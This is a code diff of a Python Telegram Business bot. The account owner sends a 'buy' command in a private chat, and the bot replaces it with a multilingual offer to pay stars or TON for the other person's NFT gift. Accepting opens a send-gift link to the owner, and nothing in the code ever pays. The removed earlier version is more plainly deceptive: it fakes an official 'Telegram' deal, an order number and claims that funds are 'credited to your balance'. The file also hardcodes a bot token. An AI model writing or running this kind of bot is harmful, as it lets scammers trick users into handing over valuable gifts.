@@ -1,201 +1,285 @@
+"""
+Telegram Business-бот: buy <ссылка на NFT> <сумма> <stars|ton> <ru|en|ar|zh>
+Установка: pip install -r requirements.txt
+Запуск:    python bot.py
+"""
 import asyncio
-import logging
-import re
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.utils.keyboard import InlineKeyboardBuilder
+import html
+import json
+import os
+import httpx
 
+# ===================== НАСТРОЙКИ =====================
 BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
 
-# ID премиум-эмодзи
-EMOJI_STAR = "5289728073040672852"
+EMOJI_STAR  = "5289728073040672852"
 EMOJI_CHECK = "5776375003280838798"
 EMOJI_CROSS = "5778527486270770928"
 
-STAR = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
-CHECK = f'<tg-emoji emoji-id="{EMOJI_CHECK}">✅</tg-emoji>'
-CROSS = f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji>'
+# {username} подставляется автоматически из бизнес-подключения
+ACCEPT_URL = "tg://send_gift?to={username}"
+ACCEPT_URL_FALLBACK = "https://t.me/{username}"
+# =====================================================
 
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
+API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+STATE_FILE = "state.json"
 
-TEXTS = {
-    "ru": {
-        "title": "Сделка с NFT",
-        "reserved": "Покупатель зарезервировал {amount} {star} средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
-        "instruction": "<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {nft_name}\n2. Подтвердите передачу подарка.",
-        "footer": "Платформа зафиксирует сделку и моментально зачислит {amount} {star} на ваш баланс. Резерв действует 24 часа.",
-        "btn_give": "Передать подарок",
-        "btn_confirm": "Подтвердить передачу",
-        "btn_accept": "Принять",
-        "btn_decline": "Отклонить",
-        "status_done": "Сделка успешно завершена! Средства зачислены.",
-    },
-    "en": {
-        "title": "NFT Deal",
-        "reserved": "Buyer has reserved {amount} {star} funds are protected and will be automatically credited to your balance immediately after the gift is transferred.",
-        "instruction": "<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {nft_name}\n2. Confirm the gift transfer.",
-        "footer": "The platform will record the deal and instantly credit {amount} {star} to your balance. The reserve is valid for 24 hours.",
-        "btn_give": "Give Gift",
-        "btn_confirm": "Confirm Transfer",
-        "btn_accept": "Accept",
-        "btn_decline": "Decline",
-        "status_done": "Deal successfully completed! Funds credited.",
-    },
-    "ar": {
-        "title": "صفقة NFT",
-        "reserved": "احتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم إضافتها تلقائيًا إلى رصيدك فور نقل الهدية.",
-        "instruction": "<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {nft_name}\n2. أكد نقل الهدية.",
-        "footer": "ستسجل المنصة الصفقة وتضيف {amount} {star} على الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
-        "btn_give": "تقديم الهدية",
-        "btn_confirm": "تأكيد النقل",
-        "btn_accept": "قبول",
-        "btn_decline": "رفض",
-        "status_done": "تمت الصفقة بنجاح! تم إضافة الأموال.",
-    },
-    "zh": {
-        "title": "NFT 交易",
-        "reserved": "买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。",
-        "instruction": "<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {nft_name}\n2. 确认礼物转移。",
-        "footer": "平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
-        "btn_give": "赠送礼物",
-        "btn_confirm": "确认转移",
-        "btn_accept": "接受",
-        "btn_decline": "拒绝",
-        "status_done": "交易成功完成！资金已到账。",
-    }
+connections: dict[str, dict] = {}
+state: dict[str, dict] = {}
+
+if os.path.exists(STATE_FILE):
+    try:
+        state = json.load(open(STATE_FILE, encoding="utf-8"))
+    except Exception:
+        state = {}
+
+
+def save_state():
+    json.dump(state, open(STATE_FILE, "w", encoding="utf-8"), ensure_ascii=False)
+
+
+def em(emoji_id: str, fallback: str) -> str:
+    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
+
+
+# ---------- тексты (ru/en/ar/zh) ----------
+_L = {
+    "ru": (
+        "Пользователь (@{user}) предлагает вам\n{amount} {cur} за подарок {gift}.",
+        "ПРИНЯТЬ", "ОТКЛОНИТЬ",
+        "Предложение отклонено",
+        "Предложение принято!",
+        "Перейти к подарку",
+    ),
+    "en": (
+        "User (@{user}) offers you\n{amount} {cur} for the gift {gift}.",
+        "ACCEPT", "DECLINE",
+        "Offer declined",
+        "Offer accepted!",
+        "Go to gift",
+    ),
+    "ar": (
+        "المستخدم (@{user}) يعرض عليك\n{amount} {cur} مقابل الهدية {gift}.",
+        "قبول", "رفض",
+        "تم رفض العرض",
+        "تم قبول العرض!",
+        "الذهاب إلى الهدية",
+    ),
+    "zh": (
+        "用户 (@{user}) 向您报价\n{amount} {cur} 购买礼物 {gift}。",
+        "接受", "拒绝",
+        "报价已拒绝",
+        "报价已接受！",
+        "前往礼物",
+    ),
 }
+TEXTS = {}
+for _k, (_o, _a, _d, _dec, _acc, _go) in _L.items():
+    TEXTS[_k] = {
+        "offer": _o,
+        "accept_btn": _a,
+        "decline_btn": _d,
+        "declined": "{cross} <b>" + _dec + "</b>",
+        "accepted": "{check} <b>" + _acc + "</b>\n" + _o.split("\n", 1)[1],
+        "go_btn": _go,
+    }
 
-# --- ОБРАБОТЧИК КОМАНДЫ buy В БИЗНЕС-ЧАТЕ ---
-# Срабатывает на сообщения, отправленные ВЛАДЕЛЬЦЕМ аккаунта
-@dp.business_message(F.text.regexp(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$", flags=re.IGNORECASE))
-async def handle_business_buy(message: types.Message):
-    match = message.text.match(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$")
-    
-    if not match:
+LANG_ALIASES = {"ua": "uk", "cn": "zh", "zh-cn": "zh", "ae": "ar", "us": "en", "gb": "en"}
+
+
+def cur_html(cur: str) -> str:
+    if cur == "stars":
+        return em(EMOJI_STAR, "⭐️")
+    return html.escape(cur.upper())
+
+
+def gift_html(link: str) -> str:
+    slug = link.rstrip("/").split("/")[-1]
+    if "-" in slug:
+        n, i = slug.rsplit("-", 1)
+        name = f"{n} #{i}"
+    else:
+        name = slug
+    return f'<a href="{html.escape(link)}">{html.escape(name)}</a>'
+
+
+def preview(link: str) -> dict:
+    return {"url": link, "show_above_text": True, "prefer_large_media": True}
+
+
+async def call(client: httpx.AsyncClient, method: str, **params):
+    r = await client.post(f"{API}/{method}", json=params, timeout=70)
+    data = r.json()
+    if not data.get("ok"):
+        print(f"[API ERROR] {method}: {data}")
+    return data
+
+
+def offer_keyboard(t: dict, with_icons: bool = True) -> dict:
+    if with_icons:
+        return {"inline_keyboard": [[
+            {"text": t["accept_btn"], "callback_data": "ok", "icon_custom_emoji_id": EMOJI_CHECK},
+            {"text": t["decline_btn"], "callback_data": "no", "icon_custom_emoji_id": EMOJI_CROSS},
+        ]]}
+    return {"inline_keyboard": [[
+        {"text": "✅ " + t["accept_btn"], "callback_data": "ok"},
+        {"text": "❌ " + t["decline_btn"], "callback_data": "no"},
+    ]]}
+
+
+async def get_connection(client, bc_id: str) -> dict:
+    if bc_id not in connections:
+        res = await call(client, "getBusinessConnection", business_connection_id=bc_id)
+        if res.get("ok"):
+            u = res["result"]["user"]
+            connections[bc_id] = {"user_id": u["id"], "username": u.get("username", "user")}
+    return connections.get(bc_id, {})
+
+
+# ---------- обработка команды buy ----------
+async def handle_business_message(client, msg: dict):
+    bc_id = msg.get("business_connection_id")
+    text = msg.get("text") or ""
+    if not bc_id or not text.lower().startswith("buy"):
         return
 
-    nft_link = match.group(1)
-    amount = match.group(2)
-    currency = match.group(3).lower()
-    lang = match.group(4).lower()
+    conn = await get_connection(client, bc_id)
+    if not conn or msg.get("from", {}).get("id") != conn["user_id"]:
+        return
 
-    t = TEXTS.get(lang, TEXTS["ru"])
-    nft_name = nft_link.split("/")[-1].replace("-", " #").replace("_", " ")
+    parts = text.split()
+    if len(parts) < 3 or parts[0].lower() != "buy":
+        return
+    link = parts[1]
+    amount = parts[2]
+    cur = parts[3].lower() if len(parts) > 3 else "stars"
+    lang = parts[4].lower() if len(parts) > 4 else "ru"
+    lang = LANG_ALIASES.get(lang, lang)
+    if lang not in TEXTS:
+        lang = "ru"
+    if not link.startswith("https://t.me/nft/"):
+        return
 
-    # Получатель подарка - собеседник (тот, кому вы пишете в ЛС)
-    recipient = message.chat.username or str(message.chat.id)
+    chat_id = msg["chat"]["id"]
+    t = TEXTS[lang]
 
-    # Редактируем ВАШЕ исходное сообщение (требуется разрешение "Edit messages" в настройках бота)
-    offer_text = (
-        f"<b>Telegram</b>\n"
-        f"<b>{nft_name}</b>\n\n"
-        f"Пользователь Предлагает Вам\n\n"
-        f"{amount} {STAR} за подарок <a href='{nft_link}'>{nft_name}</a>.\n\n"
-        f"Предложение действует еще 5 ч. 59 мин."
+    await call(client, "deleteBusinessMessages",
+               business_connection_id=bc_id, message_ids=[msg["message_id"]])
+
+    body = t["offer"].format(
+        user=html.escape(conn["username"]),
+        amount=html.escape(amount),
+        cur=cur_html(cur),
+        gift=gift_html(link),
     )
-
-    builder = InlineKeyboardBuilder()
-    builder.button(text=f"{CHECK} {t['btn_accept']}", callback_data=f"accept|{nft_link}|{amount}|{lang}|{nft_name}|{recipient}")
-    builder.button(text=f"{CROSS} {t['btn_decline']}", callback_data="decline")
-    builder.adjust(2)
-
-    try:
-        # Редактируем сообщение владельца аккаунта
-        await bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=message.message_id,
-            text=offer_text,
-            reply_markup=builder.as_markup(),
-            parse_mode="HTML",
-            disable_web_page_preview=True
+    params = dict(
+        business_connection_id=bc_id,
+        chat_id=chat_id,
+        text=body,
+        parse_mode="HTML",
+        link_preview_options=preview(link),
+    )
+    res = await call(client, "sendMessage", **params, reply_markup=offer_keyboard(t, True))
+    if not res.get("ok"):
+        res = await call(client, "sendMessage", **params, reply_markup=offer_keyboard(t, False))
+    if res.get("ok"):
+        mid = res["result"]["message_id"]
+        state[f"{chat_id}:{mid}"] = dict(
+            bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
+            owner=conn["user_id"], username=conn["username"],
         )
-    except Exception as e:
-        logging.error(f"Ошибка редактирования: {e}")
-        # Если не удалось отредактировать (нет прав), отправляем как новое
-        await bot.send_message(
-            chat_id=message.chat.id,
-            text=offer_text,
-            reply_markup=builder.as_markup(),
-            parse_mode="HTML",
-            disable_web_page_preview=True
-        )
+        save_state()
 
 
-# --- ЭТАП 2: ПРИНЯТЬ ---
-@dp.callback_query(F.data.startswith("accept|"))
-async def process_accept(callback: types.CallbackQuery):
-    _, nft_link, amount, lang, nft_name, recipient = callback.data.split("|")
-    t = TEXTS.get(lang, TEXTS["ru"])
+# ---------- нажатия на кнопки ----------
+async def handle_callback(client, cq: dict):
+    msg = cq.get("message") or {}
+    chat_id = msg.get("chat", {}).get("id")
+    mid = msg.get("message_id")
+    key = f"{chat_id}:{mid}"
+    st = state.get(key)
+    if not st:
+        await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
+        return
 
-    deal_text = (
-        f"<b>{t['title']}</b>\n\n"
-        f"Заказ #TG-67654174-0\n\n"
-        f"{t['reserved'].format(amount=amount, star=STAR)}\n\n"
-        f"{t['instruction'].format(nft_name=nft_name)}\n\n"
-        f"{t['footer'].format(amount=amount, star=STAR)}"
+    if cq["from"]["id"] == st["owner"]:
+        await call(client, "answerCallbackQuery", callback_query_id=cq["id"],
+                   text="Это предложение для собеседника")
+        return
+
+    t = TEXTS[st["lang"]]
+    link = st["link"]
+    gift = gift_html(link)
+    cur = cur_html(st["cur"])
+    amount = html.escape(st["amount"])
+
+    declined = cq["data"] == "no"
+    if declined:
+        new_text = t["declined"].format(cross=em(EMOJI_CROSS, "❌"))
+        markup = {"inline_keyboard": []}
+    else:
+        new_text = t["accepted"].format(check=em(EMOJI_CHECK, "✅"),
+                                        amount=amount, cur=cur, gift=gift)
+        url = ACCEPT_URL.format(username=st["username"])
+        markup = {"inline_keyboard": [[{"text": t["go_btn"], "url": url}]]}
+
+    await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
+    edit = dict(
+        business_connection_id=msg.get("business_connection_id") or st["bc"],
+        chat_id=chat_id, message_id=mid,
+        text=new_text, parse_mode="HTML",
+        link_preview_options=preview(link),
     )
-
-    # Ссылка на отправку подарка собеседнику
-    gift_link = f"tg://send_gift?to={recipient}"
-
-    builder = InlineKeyboardBuilder()
-    builder.button(text=t['btn_give'], url=gift_link)
-    builder.button(text=t['btn_confirm'], callback_data=f"confirm|{amount}|{lang}|{nft_name}")
-    builder.adjust(1)
-
-    try:
-        # Редактируем сообщение на этап "Сделка"
-        await callback.message.edit_text(deal_text, reply_markup=builder.as_markup(), parse_mode="HTML")
-    except Exception as e:
-        logging.error(f"Ошибка редактирования на этапе 2: {e}")
-        
-    await callback.answer("Вы приняли предложение.")
+    res = await call(client, "editMessageText", **edit, reply_markup=markup)
+    if not res.get("ok") and not declined:
+        url = ACCEPT_URL_FALLBACK.format(username=st["username"])
+        markup = {"inline_keyboard": [[{"text": t["go_btn"], "url": url}]]}
+        await call(client, "editMessageText", **edit, reply_markup=markup)
+    state.pop(key, None)
+    save_state()
 
 
-# --- ЭТАП 3: ПОДТВЕРДИТЬ ---
-@dp.callback_query(F.data.startswith("confirm|"))
-async def process_confirm(callback: types.CallbackQuery):
-    _, amount, lang, nft_name = callback.data.split("|")
-    t = TEXTS.get(lang, TEXTS["ru"])
-
-    final_text = (
-        f"<b>{t['title']}</b>\n\n"
-        f"{CHECK} {t['status_done']}\n\n"
-        f"Вы передали подарок <b>{nft_name}</b>.\n"
-        f"На ваш баланс зачислено <b>{amount} {STAR}</b>."
-    )
-
-    builder = InlineKeyboardBuilder()
-    builder.button(text=f"{CHECK} Готово", callback_data="noop")
-    builder.adjust(1)
-
-    try:
-        # Редактируем на финальный этап
-        await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")
-    except Exception as e:
-        logging.error(f"Ошибка редактирования на этапе 3: {e}")
-
-    await callback.answer("Сделка завершена!")
-
-
-# --- ОТКЛОНИТЬ ---
-@dp.callback_query(F.data == "decline")
-async def process_decline(callback: types.CallbackQuery):
-    try:
-        await callback.message.edit_text(f"{CROSS} Вы отклонили предложение.", parse_mode="HTML")
-    except Exception as e:
-        logging.error(f"Ошибка редактирования при отказе: {e}")
-    await callback.answer("Предложение отклонено.")
-
-
-@dp.callback_query(F.data == "noop")
-async def process_noop(callback: types.CallbackQuery):
-    await callback.answer("Сделка закрыта.")
+# ---------- помощник: узнать ID премиум-эмодзи ----------
+async def handle_private(client, msg: dict):
+    ents = [e for e in msg.get("entities", []) if e["type"] == "custom_emoji"]
+    if not ents:
+        if msg.get("text", "").startswith("/start"):
+            await call(client, "sendMessage", chat_id=msg["chat"]["id"],
+                       text="Пришли мне премиум-эмодзи - я скажу его ID.")
+        return
+    lines = [f"<code>{e['custom_emoji_id']}</code>" for e in ents]
+    await call(client, "sendMessage", chat_id=msg["chat"]["id"],
+               parse_mode="HTML", text="ID эмодзи:\n" + "\n".join(lines))
 
 
 async def main():
-    logging.basicConfig(level=logging.INFO)
-    await dp.start_polling(bot)
+    if not BOT_TOKEN or BOT_TOKEN.startswith("ВАШ_"):
+        raise SystemExit("Укажи BOT_TOKEN в блоке НАСТРОЙКИ в начале файла")
+    offset = 0
+    async with httpx.AsyncClient() as client:
+        print("Бот запущен")
+        while True:
+            res = await call(client, "getUpdates", offset=offset, timeout=50,
+                             allowed_updates=["message", "callback_query",
+                                              "business_connection", "business_message"])
+            for u in res.get("result", []):
+                offset = u["update_id"] + 1
+                try:
+                    if "business_connection" in u:
+                        bc = u["business_connection"]
+                        connections[bc["id"]] = {
+                            "user_id": bc["user"]["id"],
+                            "username": bc["user"].get("username", "user"),
+                        }
+                    elif "business_message" in u:
+                        await handle_business_message(client, u["business_message"])
+                    elif "callback_query" in u:
+                        await handle_callback(client, u["callback_query"])
+                    elif "message" in u:
+                        await handle_private(client, u["message"])
+                except Exception as e:
+                    print("ERR:", repr(e))
+
 
 if __name__ == "__main__":
     asyncio.run(main())
